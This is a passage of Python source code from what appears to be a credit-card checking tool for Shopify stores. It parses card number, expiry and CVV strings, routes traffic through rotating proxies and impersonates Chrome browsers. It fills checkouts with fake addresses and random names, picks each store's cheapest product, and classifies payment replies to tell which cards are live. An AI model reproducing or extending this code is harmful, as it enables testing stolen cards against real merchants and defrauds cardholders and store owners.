async def _get_global_semaphore():
    global _global_semaphore
    if _global_semaphore is None:
        async with _global_semaphore_lock:
            if _global_semaphore is None:
                _global_semaphore = asyncio.Semaphore(_cfg("MAX_CONCURRENT", 500))
    return _global_semaphore


async def _get_user_semaphore(uid):
    if uid:
        safe_uid = hashlib.sha256(str(uid).encode()).hexdigest()[:16]
    else:
        safe_uid = "anonymous"
    async with _user_semaphore_lock:
        if safe_uid not in _user_semaphores:
            _user_semaphores[safe_uid] = asyncio.Semaphore(_cfg("MAX_PER_USER", 100))
        return _user_semaphores[safe_uid]


# ============================================================
# Singletons
# ============================================================
_proxy_cb = ProxyCircuitBreaker()
_site_cb = SiteCircuitBreaker()
_site_sem_mgr = SiteSemaphoreManager()
_proxy_manager = ProxyManager()


# ============================================================
# C2C (currency → country)
# ============================================================
C2C = {
    "USD": "US", "CAD": "CA", "INR": "IN", "AED": "AE",
    "HKD": "HK", "GBP": "GB", "CHF": "CH", "AUD": "AU",
    "EUR": "DE", "JPY": "JP", "SGD": "SG", "CNY": "CN",
    "NZD": "NZ", "MXN": "MX", "SEK": "SE", "NOK": "NO", "DKK": "DK",
}


# ============================================================
# Address Book
# ============================================================
book = {
    "US": [
        {"address1": "350 Fifth Ave", "city": "New York", "postalCode": "10118", "zoneCode": "NY", "countryCode": "US", "phone": "2125550100"},
        {"address1": "233 S Wacker Dr", "city": "Chicago", "postalCode": "60606", "zoneCode": "IL", "countryCode": "US", "phone": "3125550147"},
        {"address1": "1 Apple Park Way", "city": "Cupertino", "postalCode": "95014", "zoneCode": "CA", "countryCode": "US", "phone": "4085550100"},
        {"address1": "888 Brickell Ave", "city": "Miami", "postalCode": "33131", "zoneCode": "FL", "countryCode": "US", "phone": "3055550189"},
        {"address1": "100 Main St", "city": "Houston", "postalCode": "77002", "zoneCode": "TX", "countryCode": "US", "phone": "7135550142"},
    ],
    "CA": [
        {"address1": "88 Queen St W", "city": "Toronto", "postalCode": "M5H 2M4", "zoneCode": "ON", "countryCode": "CA", "phone": "4165550198"},
        {"address1": "1055 W Georgia St", "city": "Vancouver", "postalCode": "V6E 3P3", "zoneCode": "BC", "countryCode": "CA", "phone": "6045550100"},
        {"address1": "1000 De La Commune", "city": "Montreal", "postalCode": "H2L 1X3", "zoneCode": "QC", "countryCode": "CA", "phone": "5145550145"},
    ],
    "GB": [
        {"address1": "221B Baker St", "city": "London", "postalCode": "NW1 6XE", "zoneCode": "ENG", "countryCode": "GB", "phone": "2079460123"},
        {"address1": "1 Piccadilly", "city": "London", "postalCode": "W1J 0DA", "zoneCode": "ENG", "countryCode": "GB", "phone": "2074990234"},
        {"address1": "30 St Mary Axe", "city": "London", "postalCode": "EC3A 8BF", "zoneCode": "ENG", "countryCode": "GB", "phone": "2070717234"},
    ],
    "AU": [
        {"address1": "1 Martin Place", "city": "Sydney", "postalCode": "2000", "zoneCode": "NSW", "countryCode": "AU", "phone": "291234567"},
        {"address1": "120 Collins St", "city": "Melbourne", "postalCode": "3000", "zoneCode": "VIC", "countryCode": "AU", "phone": "396541234"},
        {"address1": "45 Eagle St", "city": "Brisbane", "postalCode": "4000", "zoneCode": "QLD", "countryCode": "AU", "phone": "732210000"},
    ],
    "IN": [
        {"address1": "221B MG Road", "city": "Mumbai", "postalCode": "400001", "zoneCode": "MH", "countryCode": "IN", "phone": "2222625757"},
        {"address1": "15 Brigade Road", "city": "Bangalore", "postalCode": "560001", "zoneCode": "KA", "countryCode": "IN", "phone": "8022221000"},
        {"address1": "10 Connaught Place", "city": "New Delhi", "postalCode": "110001", "zoneCode": "DL", "countryCode": "IN", "phone": "1123341234"},
    ],
    "AE": [
        {"address1": "Burj Khalifa Tower", "city": "Dubai", "postalCode": "00000", "zoneCode": "DU", "countryCode": "AE", "phone": "97143231234"},
        {"address1": "Al Maryah Island", "city": "Abu Dhabi", "postalCode": "00000", "zoneCode": "AZ", "countryCode": "AE", "phone": "97126969696"},
    ],
    "HK": [
        {"address1": "88 Queensway", "city": "Admiralty", "postalCode": "999077", "zoneCode": "HK", "countryCode": "HK", "phone": "85228689111"},
        {"address1": "Nathan Road 100", "city": "Kowloon", "postalCode": "999077", "zoneCode": "KL", "countryCode": "HK", "phone": "85227216688"},
    ],
    "CN": [
        {"address1": "8 Zhongguancun St", "city": "Beijing", "postalCode": "100080", "zoneCode": "11", "countryCode": "CN", "phone": "1062512345"},
        {"address1": "100 Century Ave", "city": "Shanghai", "postalCode": "200120", "zoneCode": "31", "countryCode": "CN", "phone": "2150504000"},
    ],
    "CH": [
        {"address1": "Gotthardstrasse 17", "city": "Zurich", "postalCode": "8002", "zoneCode": "ZH", "countryCode": "CH", "phone": "442012000"},
        {"address1": "Rue du Rhone 48", "city": "Geneva", "postalCode": "1204", "zoneCode": "GE", "countryCode": "CH", "phone": "227083300"},
    ],
    "DE": [
        {"address1": "Unter den Linden 77", "city": "Berlin", "postalCode": "10117", "zoneCode": "BE", "countryCode": "DE", "phone": "3020450"},
        {"address1": "Maximilianstr 5", "city": "Munich", "postalCode": "80539", "zoneCode": "BY", "countryCode": "DE", "phone": "8921230"},
        {"address1": "Kaiserstr 10", "city": "Frankfurt", "postalCode": "60311", "zoneCode": "HE", "countryCode": "DE", "phone": "6921230"},
    ],
    "FR": [
        {"address1": "1 Ave des Champs-Elysees", "city": "Paris", "postalCode": "75008", "zoneCode": "IDF", "countryCode": "FR", "phone": "140695000"},
        {"address1": "20 Rue de la Paix", "city": "Paris", "postalCode": "75002", "zoneCode": "IDF", "countryCode": "FR", "phone": "142333333"},
    ],
    "NL": [
        {"address1": "Dam 1", "city": "Amsterdam", "postalCode": "1012 JS", "zoneCode": "NH", "countryCode": "NL", "phone": "2055000200"},
        {"address1": "Binnenhof 1A", "city": "The Hague", "postalCode": "2513 AA", "zoneCode": "ZH", "countryCode": "NL", "phone": "703564434"},
    ],
    "SG": [
        {"address1": "1 Raffles Place", "city": "Singapore", "postalCode": "048616", "zoneCode": "SG", "countryCode": "SG", "phone": "65350001"},
        {"address1": "8 Marina View", "city": "Singapore", "postalCode": "018960", "zoneCode": "SG", "countryCode": "SG", "phone": "65350002"},
    ],
    "JP": [
        {"address1": "2-1 Marunouchi", "city": "Tokyo", "postalCode": "100-0005", "zoneCode": "13", "countryCode": "JP", "phone": "332138888"},
        {"address1": "1-chome Namba", "city": "Osaka", "postalCode": "542-0076", "zoneCode": "27", "countryCode": "JP", "phone": "662414101"},
    ],
    "MX": [
        {"address1": "Paseo de la Reforma 505", "city": "Mexico City", "postalCode": "06600", "zoneCode": "CMX", "countryCode": "MX", "phone": "5555550100"},
        {"address1": "Av Constitucion 1065", "city": "Monterrey", "postalCode": "64000", "zoneCode": "NLE", "countryCode": "MX", "phone": "8183330100"},
    ],
    "SE": [
        {"address1": "Drottninggatan 53", "city": "Stockholm", "postalCode": "111 21", "zoneCode": "AB", "countryCode": "SE", "phone": "86790000"},
    ],
    "NO": [
        {"address1": "Karl Johans Gate 22", "city": "Oslo", "postalCode": "0026", "zoneCode": "03", "countryCode": "NO", "phone": "22341000"},
    ],
    "DK": [
        {"address1": "Stroget 5", "city": "Copenhagen", "postalCode": "1001", "zoneCode": "84", "countryCode": "DK", "phone": "33150000"},
    ],
    "NZ": [
        {"address1": "1 Queen St", "city": "Auckland", "postalCode": "1010", "zoneCode": "AUK", "countryCode": "NZ", "phone": "93090000"},
        {"address1": "148 Lambton Quay", "city": "Wellington", "postalCode": "6011", "zoneCode": "WGN", "countryCode": "NZ", "phone": "44990000"},
    ],
    "DEFAULT": [
        {"address1": "350 Fifth Ave", "city": "New York", "postalCode": "10118", "zoneCode": "NY", "countryCode": "US", "phone": "2125550100"},
        {"address1": "233 S Wacker Dr", "city": "Chicago", "postalCode": "60606", "zoneCode": "IL", "countryCode": "US", "phone": "3125550147"},
    ],
}


# ============================================================
# Keywords
# ============================================================
_OTP_REGEX = re.compile(r"(?<![A-Z0-9])OTP")


_APPROVED_KEYWORDS = (
    "3DS_AUTHENTICATION", "3DS_AUTH", "3DS",
    "AUTHENTICATION_REQUIRED", "ACTIONREQUIRED", "ACTION_REQUIRED",
    "INSUFFICIENT_FUNDS", "INSUFFICIENT FUNDS", "NOT SUFFICIENT FUNDS",
    "INCORRECT_CVC", "INVALID_CVC", "SECURITY_CODE",
    "CVV", "CVC_MISMATCH",
    "INCORRECT_ZIP", "INCORRECT ZIP",
    "OTP_REQUIRED",
    "INCORRECT_NUMBER", "INVALID_NUMBER",
)

_DECLINED_KEYWORDS = (
    "CARD_DECLINED", "DECLINED", "DO_NOT_HONOR", "GENERIC_ERROR",
    "EXPIRED_CARD", "PICKUP_CARD",
    "LOST_CARD", "STOLEN_CARD", "FRAUD", "CALL_ISSUER",
    "TRANSACTION_NOT_ALLOWED", "PROCESSING_ERROR",
    "PAYMENT_METHOD_NOT_AVAILABLE", "AUTHENTICATION_FAILED",
    "INVALID_CC", "INVALID_CARD",
    "PAYMENT_FAILED",
)

_INFRA_ERROR_KEYWORDS = (
    "STEP ", "FAILED:", "RETURNED 4", "RETURNED 5", "RETURNED 402",
    "RETURNED 422", "RETURNED 429", "CURL:", "CONNECT TUNNEL",
    "COULD NOT EXTRACT", "COULD NOT", "POLL ", "EXCEEDED 30",
    "PROXY", "TIMEOUT", "TIMED OUT", "INVENTORYRESERVATIONFAILURE",
    "NO SHOPIFY", "LIBCURL",
    'receipt id is empty', 'handle is empty', 'product id is empty',
    'tax amount is empty', 'payment method identifier is empty',
    'invalid url', 'error in 1st req', 'error in 1 req',
    'cloudflare', 'connection failed', 'timed out',
    'access denied', 'tlsv1 alert', 'ssl routines',
    'could not resolve', 'domain name not found',
    'name or service not known', 'openssl ssl_connect',
    'empty reply from server', 'httperror504', 'http error',
    '502', '503', '504', 'bad gateway', 'service unavailable',
    'gateway timeout', 'network error', 'connection reset',
    'failed to detect product', 'failed to create checkout',
    'failed to tokenize card', 'failed to get proposal data',
    'submit rejected:', 'handle error', 'http 404',
    'delivery_delivery_line_detail_changed', 'delivery_address2_required',
    'url rejected', 'malformed input', 'amount_too_small',
    'site dead', 'captcha_required', 'captcha required', 'site errors',
    'no_session_token', 'tokenize_fail',
    'cart failed with status', 'checkout failed:',
    'graphql error: invalid json',
    'negotiation failed', 'checkpoint denied',
    'throttled - retry', 'rate_limited_429',
    'session_token_expired', 'session_creation_failed',
    'invalid_session', 'session_error',
)

_INFRA_ERROR_UPPER = tuple(k.upper() for k in _INFRA_ERROR_KEYWORDS)


def _is_approved_keyword(msg_upper: str) -> bool:
    if any(k in msg_upper for k in _APPROVED_KEYWORDS):
        return True
    return _OTP_REGEX.search(msg_upper) is not None


# ============================================================
# UA Profiles (Chrome 136 only)
# ============================================================
_UA_PROFILES = [
    ('Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
     '"Chromium";v="136", "Google Chrome";v="136", "Not-A.Brand";v="8"', '?0', '"macOS"'),
    ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
     '"Chromium";v="136", "Google Chrome";v="136", "Not-A.Brand";v="24"', '?0', '"Windows"'),
]


def pick_ua_profile():
    return random.choice(_UA_PROFILES)


def pick_addr(url, cc=None, rc=None):
    cc = (cc or "").upper()
    rc = (rc or "").upper()
    dom = urlparse(url).netloc
    tcn = dom.split('.')[-1].upper()

    def _pick(entries):
        return random.choice(entries) if isinstance(entries, list) else entries

    if tcn in book:
        return _pick(book[tcn])

    ccn = C2C.get(cc)
    if rc in book and ccn == rc:
        return _pick(book[rc])
    elif rc in book:
        return _pick(book[rc])
    return _pick(book["DEFAULT"])


# ============================================================
# Safe Extractors
# ============================================================
def _get_status(resp) -> int:
    if resp is None:
        return 0
    s = getattr(resp, "status_code", None)
    if s is None:
        s = getattr(resp, "status", None)
    try:
        return int(s) if s is not None else 0
    except (TypeError, ValueError):
        return 0


def _get_text(resp) -> str:
    if resp is None:
        return ""
    t = getattr(resp, "text", "")
    if t is None:
        return ""
    if isinstance(t, str):
        return t
    if isinstance(t, bytes):
        try:
            return t.decode("utf-8", errors="ignore")
        except Exception:
            return ""
    return str(t)


def extract_between(text, start, end):
    if not text or not start or not end:
        return None
    try:
        if start in text:
            parts = text.split(start, 1)
            if len(parts) > 1:
                if end in parts[1]:
                    result = parts[1].split(end, 1)[0]
                    return result if result else None
        return None
    except Exception:
        return None


def _extract_checkout_config_field(text, field_name):
    if not text:
        return None
    try:
        m = re.search(
            r'<script[^>]*id=["\']checkout-configuration["\'][^>]*>(.*?)</script>',
            text, re.DOTALL
        )
        if m:
            block = m.group(1)
            fm = re.search(
                r'"' + re.escape(field_name) + r'"\s*:\s*"([^"]{4,})"',
                block
            )
            if fm:
                return fm.group(1)
        fm = re.search(
            r'"' + re.escape(field_name) + r'"\s*:\s*"([^"]{4,})"',
            text
        )
        return fm.group(1) if fm else None
    except Exception:
        return None


def _extract_payment_terms_id(body: str) -> str:
    """يستخرج sellerProposal.paymentFlexibilityPaymentTermsTemplate.id بأمان."""
    if not body:
        return ""
    try:
        d = json.loads(body)
        seller = (
            ((d.get("data") or {}).get("session") or {})
            .get("negotiate", {}).get("result", {})
            .get("sellerProposal") or {}
        )
        pt = seller.get("paymentFlexibilityPaymentTermsTemplate")
        if isinstance(pt, dict):
            return pt.get("id") or ""
    except Exception:
        pass
    m = re.search(
        r'"paymentFlexibilityPaymentTermsTemplate"\s*:\s*\{[^}]*?"id"\s*:\s*"([^"]+)"',
        body,
    )
    return m.group(1) if m else ""


# ============================================================
# Classification
# ============================================================
def extract_clean_response(message):
    if not message:
        return "UNKNOWN_ERROR"
    msg = str(message)
    msg_upper = msg.upper()

    if any(k in msg_upper for k in ("ORDER_PLACED", "SUCCESSFULRECEIPT", "PROCESSEDRECEIPT")):
        return "ORDER_PLACED"

    _hard_decline = (
        "CARD_DECLINED", "DO_NOT_HONOR", "LOST_CARD", "STOLEN_CARD",
        "FRAUD", "PICKUP_CARD", "CALL_ISSUER",
        "PAYMENT_METHOD_NOT_AVAILABLE", "AUTHENTICATION_FAILED",
        "INVALID_CC", "INVALID_CARD", "CARD_EXPIRED", "EXPIRED_CARD",
        "TRANSACTION_NOT_ALLOWED", "RESTRICTED_CARD",
    )
    if any(k in msg_upper for k in _hard_decline):
        return "CARD_DECLINED"

    if any(k in msg_upper for k in ("3DS_AUTHENTICATION", "3DS_AUTH", "3DS_REQUIRED")):
        return "3DS_AUTHENTICATION"
    if "OTP_REQUIRED" in msg_upper or _OTP_REGEX.search(msg_upper):
        return "OTP_REQUIRED"
    if "ACTION_REQUIRED" in msg_upper or "ACTIONREQUIRED" in msg_upper:
        return "ACTION_REQUIRED"
    if "AUTHENTICATION_REQUIRED" in msg_upper:
        return "AUTHENTICATION_REQUIRED"

    if any(k in msg_upper for k in (
        "INSUFFICIENT_FUNDS", "INSUFFICIENT FUNDS", "NOT SUFFICIENT FUNDS",
        "EXCEEDS_BALANCE", "INSUFFICIENT_BALANCE",
    )):
        return "INSUFFICIENT_FUNDS"

    if any(k in msg_upper for k in ("INCORRECT_NUMBER", "INVALID_NUMBER")):
        return "INCORRECT_NUMBER"
    if any(k in msg_upper for k in ("INCORRECT_CVC", "INVALID_CVC", "SECURITY_CODE", "CVC_MISMATCH")):
        return "INCORRECT_CVC"
    if any(k in msg_upper for k in ("INCORRECT_ZIP", "INCORRECT ZIP")):
        return "INCORRECT_ZIP"

    _prefixes = ("Site error: ", "Site errors: ", "Error: ", "ERROR: ")
    for _pfx in _prefixes:
        if message.startswith(_pfx):
            message = message[len(_pfx):]
            break

    _KNOWN = {
        "RATE_LIMITED_429", "PRICE_TOO_HIGH", "CAPTCHA_REQUIRED",
        "ORDER_PLACED", "CARD_DECLINED", "TIMEOUT", "OTP_REQUIRED",
        "ORDER_TOTAL_CHANGED", "MISMATCHED_BILL", "PROXY_ERROR",
        "ACTION_REQUIRED", "3DS_REQUIRED", "AUTHENTICATION_REQUIRED",
        "INSUFFICIENT_FUNDS", "INSUFFICIENT_BALANCE", "DECLINED",
        "PAYMENT_FAILED", "CARD_EXPIRED", "INVALID_CC",
        "3DS_AUTHENTICATION", "INCORRECT_NUMBER",
    }
    if message.strip() in _KNOWN:
        return message.strip()

    patterns = [
        r'(PAYMENTS_[A-Z0-9_]+)', r'(CARD_[A-Z0-9_]+)',
        r'([A-Z]+_[A-Z0-9]+_[A-Z0-9_]+)', r'([A-Z]+_[A-Z0-9_]+)',
        r'code["\']?\s*[:=]\s*["\']?([^"\',\s]+)["\']?',
        r'{"code":"([^"]+)"', r"'code':'([^']+)'"
    ]
    for pattern in patterns:
        matches = re.findall(pattern, message, re.IGNORECASE)
        for match in matches:
            if isinstance(match, tuple):
                match = match[0]
            if match and "_" in match and len(match) < 60:
                match_upper = match.upper()
                if "3DS" in match_upper:
                    return "3DS_AUTHENTICATION"
                if _OTP_REGEX.search(match_upper):
                    return "OTP_REQUIRED"
                if "INSUFFICIENT" in match_upper or "BALANCE" in match_upper:
                    return "INSUFFICIENT_FUNDS"
                if "INCORRECT_NUMBER" in match_upper or "INVALID_NUMBER" in match_upper:
                    return "INCORRECT_NUMBER"
                if "ACTION" in match_upper and "REQUIRED" in match_upper:
                    return "ACTION_REQUIRED"
                return match_upper

    words = message.split()
    if words:
        first_word = words[0]
        if "_" in first_word and first_word.replace("_", "").isalnum():
            first_upper = first_word.upper()
            if "3DS" in first_upper:
                return "3DS_AUTHENTICATION"
            if _OTP_REGEX.search(first_upper):
                return "OTP_REQUIRED"
            if "INCORRECT_NUMBER" in first_upper or "INVALID_NUMBER" in first_upper:
                return "INCORRECT_NUMBER"
            return first_upper

    if "invalid json" in message.lower():
        return "INVALID_JSON_RESPONSE"
    if "not a shopify" in message.lower():
        return "NOT_SHOPIFY_SITE"
    if "no products" in message.lower():
        return "NO_PRODUCTS_FOUND"
    if "timed out" in message.lower() or "timeout" in message.lower():
        return "TIMEOUT"
    if "rate limit" in message.lower() or "429" in message:
        return "RATE_LIMITED_429"
    if "captcha" in message.lower():
        return "CAPTCHA_REQUIRED"

    return message[:200]


# ============================================================
# Response Builder
# ============================================================
def _response_price(price):
    try:
        return float(str(price).replace(',', '').strip())
    except (TypeError, ValueError):
        return 0.0


def _build_response_data(success, message, gateway, price, currency, card, elapsed, proxy_status="Live"):
    response_code = extract_clean_response(message)
    msg_upper = str(message).upper()

    is_charged = any(k in msg_upper for k in ("ORDER_PLACED", "SUCCESSFULRECEIPT", "PROCESSEDRECEIPT"))
    is_declined = any(k in msg_upper for k in _DECLINED_KEYWORDS)
    is_approved = _is_approved_keyword(msg_upper) and not is_declined
    is_error = any(k in msg_upper for k in _INFRA_ERROR_UPPER)

    actual_success = success
    if is_charged or is_approved:
        actual_success = True
    elif is_declined or is_error:
        actual_success = False

    status_str = "true" if actual_success else "false"

    if is_charged:
        response = "ORDER_PLACED"
    elif is_approved:
        if "OTP_REQUIRED" in msg_upper or _OTP_REGEX.search(msg_upper):
            response = "OTP_REQUIRED"
        elif any(k in msg_upper for k in ("3DS_AUTHENTICATION", "3DS_AUTH", "3DS_REQUIRED")):
            response = "3DS_AUTHENTICATION"
        elif "ACTION_REQUIRED" in msg_upper or "ACTIONREQUIRED" in msg_upper:
            response = "ACTION_REQUIRED"
        elif "AUTHENTICATION_REQUIRED" in msg_upper:
            response = "AUTHENTICATION_REQUIRED"
        elif any(k in msg_upper for k in ("INSUFFICIENT_FUNDS", "BALANCE")):
            response = "INSUFFICIENT_FUNDS"
        elif any(k in msg_upper for k in ("INCORRECT_NUMBER", "INVALID_NUMBER")):
            response = "INCORRECT_NUMBER"
        elif any(k in msg_upper for k in ("INCORRECT_CVC", "INVALID_CVC", "CVV", "SECURITY_CODE")):
            response = "INCORRECT_CVC"
        elif any(k in msg_upper for k in ("INCORRECT_ZIP", "INCORRECT ZIP")):
            response = "INCORRECT_ZIP"
        else:
            response = response_code or "APPROVED"
    elif is_declined:
        response = response_code or "CARD_DECLINED"
    elif is_error:
        response = response_code or "SITE_ERROR"
    else:
        response = response_code or "UNKNOWN"

    gateway_name = gateway or "Shopify Payments"
    price_value = str(_response_price(price)) if price else "0.0"
    proxy_status_value = proxy_status if proxy_status else "Live"

    return {
        "Gateway": gateway_name,
        "Price": price_value,
        "Proxy": proxy_status_value,
        "Response": response,
        "Status": status_str,
        "CC": card,
    }


# ============================================================
# Proxy Helpers
# ============================================================
def _build_proxy_url(proxy_str):
    if not proxy_str:
        return None
    s = proxy_str.strip()
    if s.startswith(("http://", "https://", "socks5://", "socks5h://", "socks4://", "socks4a://")):
        return s
    if '@' in s:
        return f"http://{s}"
    parts = s.split(':')
    if len(parts) == 2:
        return f"http://{parts[0]}:{parts[1]}"
    elif len(parts) == 4:
        return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    elif len(parts) == 3:
        return f"http://{parts[2]}@{parts[0]}:{parts[1]}"
    return None


def is_captcha_required(response_text):
    if not response_text:
        return False
    indicators = [
        'CAPTCHA_REQUIRED',
        '"code":"CAPTCHA_REQUIRED"',
        "'code':'CAPTCHA_REQUIRED'",
        '"message":"CAPTCHA_REQUIRED"',
        'captcha required',
        'CAPTCHA CHALLENGE',
        'hcaptcha',
        'h-captcha',
    ]
    text_upper = response_text.upper()
    for indicator in indicators:
        if indicator.upper() in text_upper:
            return True
    return False


# ============================================================
# Products Cache
# ============================================================
_products_cache: Dict[str, Dict[str, Any]] = {}


def _get_cached_products(domain: str) -> Optional[List[Dict[str, Any]]]:
    entry = _products_cache.get(domain)
    if entry and time.time() - entry["ts"] < _cfg("PRODUCTS_CACHE_TTL", 120):
        return entry["data"]
    return None


def _set_cached_products(domain: str, products: List[Dict[str, Any]]) -> None:
    _products_cache[domain] = {"data": products, "ts": time.time()}
    max_size = _cfg("PRODUCTS_CACHE_MAX", 500)
    if len(_products_cache) <= max_size:
        return
    now = time.time()
    ttl = _cfg("PRODUCTS_CACHE_TTL", 120)
    stale = [k for k, v in _products_cache.items() if now - v["ts"] > ttl]
    for k in stale:
        _products_cache.pop(k, None)
    if len(_products_cache) > max_size:
        ratio = _cfg("PRODUCTS_CACHE_KEEP_RATIO", 0.8)
        keep = int(max_size * ratio)
        sorted_items = sorted(_products_cache.items(), key=lambda x: x[1].get("ts", 0))
        to_remove = len(_products_cache) - keep
        for k, _ in sorted_items[:to_remove]:
            _products_cache.pop(k, None)


# ============================================================
# Sync Products Fetcher (GraphQL-first + REST fallback)
# ============================================================
def _do_fetch_products_graphql(sess, domain, proxy_url):
    """محاولة جلب المنتجات عبر Storefront GraphQL مع sortKey:PRICE.
    تعيد بنية REST-compatible أو None عند أي فشل."""
    try:
        gql_query = """
        query Products($first: Int!) {
            products(first: $first, sortKey: PRICE, reverse: false) {
                edges {
                    node {
                        id
                        handle
                        title
                        variants(first: 100) {
                            edges {
                                node {
                                    id
                                    price { amount currencyCode }
                                    availableForSale
                                    requiresShipping
                                }
                            }
                        }
                    }
                }
            }
        }
        """
        r = sess.post(
            f"{domain}/api/2024-01/graphql.json",
            json={"query": gql_query, "variables": {"first": 100}},
            proxy=proxy_url,
            timeout=5,
        )
        if r.status_code != 200:
            return None, f"HTTP {r.status_code}"
        data = r.json()
        if "errors" in data:
            return None, "GraphQL errors"
        edges = (data.get("data") or {}).get("products", {}).get("edges") or []
        if not edges:
            return None, "Empty products"
        normalized = []
        for edge in edges:
            node = edge.get("node") or {}
            pid_raw = node.get("id", "")
            pid = pid_raw.rsplit("/", 1)[-1] if "/" in pid_raw else pid_raw
            if not pid:
                continue
            variants = []
            for ve in (node.get("variants", {}).get("edges") or []):
                vn = ve.get("node") or {}
                vid_raw = vn.get("id", "")
                vid = vid_raw.rsplit("/", 1)[-1] if "/" in vid_raw else vid_raw
                if not vid:
                    continue
                price_block = vn.get("price") or {}
                variants.append({
                    "id": int(vid) if str(vid).isdigit() else vid,
                    "price": str(price_block.get("amount", "0")),
                    "available": bool(vn.get("availableForSale", False)),
                    "requires_shipping": bool(vn.get("requiresShipping", True)),
                })
            if not variants:
                continue
            normalized.append({
                "id": int(pid) if str(pid).isdigit() else pid,
                "handle": node.get("handle", ""),
                "title": node.get("title", ""),
                "variants": variants,
            })
        if not normalized:
            return None, "No valid products"
        return normalized, None
    except Exception as e:
        return None, f"GraphQL: {str(e)[:80]}"


def _do_fetch_products(sess, domain, proxy_url):
    # ← GraphQL أولاً (سقف 5s). عند أي فشل نكمل الكود الأصلي كما هو.
    try:
        _gql_result, _gql_err = _do_fetch_products_graphql(sess, domain, proxy_url)
        if _gql_result:
            return _gql_result
    except Exception:
        pass

    _start_ts = time.time()
    _MAX_TOTAL_SEC = 25

    r = sess.get(f"{domain}/products.json?limit=250", proxy=proxy_url, timeout=20)
    if r.status_code == 401:
        return False, "Site requires login (401)"
    if r.status_code == 402:
        return False, "Site requires payment (402)"
    if r.status_code == 403:
        return False, "Access denied (403)"
    if r.status_code == 429:
        time.sleep(3)
        r = sess.get(f"{domain}/products.json?limit=250", proxy=proxy_url, timeout=20)
        if r.status_code == 429:
            return False, "RATE_LIMITED_429"
        if r.status_code != 200:
            return False, f"Site error (HTTP {r.status_code})"
    elif r.status_code != 200:
        return False, f"Site error (HTTP {r.status_code})"
    text = r.text
    if "shopify" not in text.lower():
        return False, "Not a Shopify site"
    try:
        result = r.json().get('products', [])
    except Exception:
        return False, "Invalid JSON from site"
    if not result:
        return False, "No products found"
    page = 2
    _last_page_count = len(result)
    while _last_page_count == 250 and page <= 10:
        if time.time() - _start_ts > _MAX_TOTAL_SEC:
            break
        try:
            rp = sess.get(f"{domain}/products.json?limit=250&page={page}", proxy=proxy_url, timeout=20)
            if rp.status_code != 200:
                break
            page_data = rp.json().get('products', [])
            if not page_data:
                break
            result += page_data
            _last_page_count = len(page_data)
            if _last_page_count < 250:
                break
            page += 1
        except Exception:
            break
    return result


def _sync_fetch_products(domain, proxy_url):
    try:
        try:
            with _curl_req.Session(impersonate="chrome136", verify=False) as sess:
                return _do_fetch_products(sess, domain, proxy_url)
        except Exception:
            with _curl_req.Session(impersonate="chrome124", verify=False) as sess:
                return _do_fetch_products(sess, domain, proxy_url)
    except Exception as e:
        return False, str(e) or type(e).__name__


# ============================================================
# fetch_products (outer timeout=20)
# ============================================================
async def fetch_products(domain, proxy_str=None, physical_only=False):
    if not domain.startswith('http'):
        domain = "https://" + domain
    domain = domain.rstrip('/')

    cached = _get_cached_products(domain)
    if cached is not None:
        result = cached
    else:
        proxy_url = _build_proxy_url(proxy_str)
        loop = asyncio.get_running_loop()
        try:
            raw = await asyncio.wait_for(
                loop.run_in_executor(None, _sync_fetch_products, domain, proxy_url),
                timeout=20,
            )
        except asyncio.TimeoutError:
            return False, "TIMEOUT"
        except Exception as e:
            return False, str(e)[:80]
        if isinstance(raw, tuple):
            return False, str(raw[1])[:80]
        result = raw
        _set_cached_products(domain, result)

    _SKIP_TYPES = {'gift card', 'gift cards', 'gift_card', 'gift_cards', 'e-gift card', 'egift card', 'donation'}
    _SKIP_HANDLES = ('gift-card', 'giftcard', 'gift_card', 'e-gift', 'egift', 'donation')

    def _is_uncheckable(product):
        ptype = (product.get('product_type') or '').lower().strip()
        handle = (product.get('handle') or '').lower()
        if ptype in _SKIP_TYPES:
            return True
        if any(k in handle for k in _SKIP_HANDLES):
            return True
        return False

    def _scan_products(products, skip_unavailable, physical_only=False):
        best_price = float('inf')
        best_ships = True
        best = None
        min_price = _cfg("MIN_PRICE", 0.5)
        max_price = _cfg("MAX_PRICE", 100.0)
        for product in products:
            if not product.get('variants') or _is_uncheckable(product):
                continue
            for variant in product['variants']:
                if skip_unavailable and variant.get('available') is False:
                    continue
                if variant.get('requires_selling_plan'):
                    continue
                try:
                    price = variant.get('price', '0')
                    price = float(price.replace(',', '')) if isinstance(price, str) else float(price)
                    if price < min_price or price > max_price:
                        continue
                    ships = variant.get('requires_shipping') is not False
                    if physical_only and not ships:
                        continue
                    if price < best_price or (price == best_price and not ships and best_ships):
                        best_price = price
                        best_ships = ships
                        best = {
                            'site': domain, 'price': f"{price:.2f}",
                            'variant_id': str(variant['id']),
                            'link': f"{domain}/products/{product['handle']}",
                            'requires_shipping': ships,
                        }
                except (ValueError, TypeError, AttributeError):
                    continue
        return best

    min_product = _scan_products(result, skip_unavailable=True, physical_only=physical_only)
    if not min_product:
        min_product = _scan_products(result, skip_unavailable=False, physical_only=physical_only)
    if isinstance(min_product, dict) and min_product.get('variant_id'):
        return min_product
    return False, "PRICE_TOO_HIGH"


# ============================================================
# parse_cc_string
# ============================================================
def parse_cc_string(cc_string):
    parts = [p.strip() for p in re.split(r'[|/,]', cc_string) if p.strip()]
    if len(parts) != 4:
        raise ValueError("Invalid CC format. Use: CC|MM|YYYY|CVV")
    return {
        'cc': parts[0],
        'mes': parts[1],
        'ano': parts[2],
        'cvv': parts[3],
    }


# ============================================================
# Utils
# ============================================================
class Utils:
    @staticmethod
    def get_random_name():
        first_names = [
            "James", "John", "Robert", "Michael", "William", "David", "Richard",
            "Joseph", "Thomas", "Charles", "Christopher", "Daniel", "Matthew",
            "Anthony", "Mark", "Donald", "Steven", "Paul", "Andrew", "Kenneth",
            "Joshua", "Kevin", "Brian", "George", "Timothy", "Ronald", "Edward",
            "Jason", "Jeffrey", "Ryan", "Jacob", "Gary", "Nicholas", "Eric",
            "Mary", "Patricia", "Jennifer", "Linda", "Barbara", "Susan", "Jessica",
            "Sarah", "Karen", "Lisa", "Nancy", "Betty", "Margaret", "Sandra",
            "Ashley", "Dorothy", "Kimberly", "Emily", "Donna", "Michelle", "Carol",
            "Amanda", "Melissa", "Deborah", "Stephanie", "Rebecca", "Sharon",
